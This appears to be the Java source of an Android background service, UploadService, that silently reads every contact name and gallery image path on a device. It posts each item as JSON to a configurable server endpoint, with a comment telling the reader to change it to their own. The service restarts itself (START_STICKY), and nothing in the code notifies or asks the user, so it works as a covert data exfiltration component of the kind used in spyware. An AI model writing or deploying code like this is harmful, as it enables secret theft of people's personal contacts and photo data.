package com.phc.serviceapp;

import static android.content.ContentValues.TAG;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class UploadService extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            List<String> contacts = fetchContacts();
            List<String> galleryFiles = fetchGalleryData();

            // Simulate upload
            uploadToServer(contacts, galleryFiles);
        }).start();
        return START_STICKY;
    }

    private List<String> fetchContacts() {
        List<String> contacts = new ArrayList<>();
        ContentResolver resolver = getContentResolver();
        Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                contacts.add(name);
            }
            cursor.close();
        }
        return contacts;
    }

    private List<String> fetchGalleryData() {
        List<String> filePaths = new ArrayList<>();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = getContentResolver().query(uri, projection, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                filePaths.add(filePath);
            }
            cursor.close();
        }
        return filePaths;
    }

    private void uploadToServer(List<String> contacts, List<String> galleryFiles) {
        String serverUrl = "http://127.0.0.1:8080/upload"; // Change this to your endpoint

        for (String contact : contacts) {
            try {
                // Create JSON payload for contact
                String payload = "{\"type\":\"contact\",\"data\":\"" + contact + "\"}";
                sendPostRequest(serverUrl, payload);
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload contact: " + contact, e);
            }
        }

        for (String filePath : galleryFiles) {
            try {
                // Create JSON payload for file
                String payload = "{\"type\":\"file\",\"data\":\"" + new File(filePath).getName() + "\"}";
                sendPostRequest(serverUrl, payload);
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload file: " + filePath, e);
            }
        }
    }

    private void sendPostRequest(String serverUrl, String payload) throws IOException {
        URL url = new URL(serverUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setDoOutput(true);

        // Write payload
        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = payload.getBytes("utf-8");
            os.write(input, 0, input.length);
        }

        // Read response
        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            Log.d(TAG, "Upload successful: " + payload);
        } else {
            Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode);
        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }





}

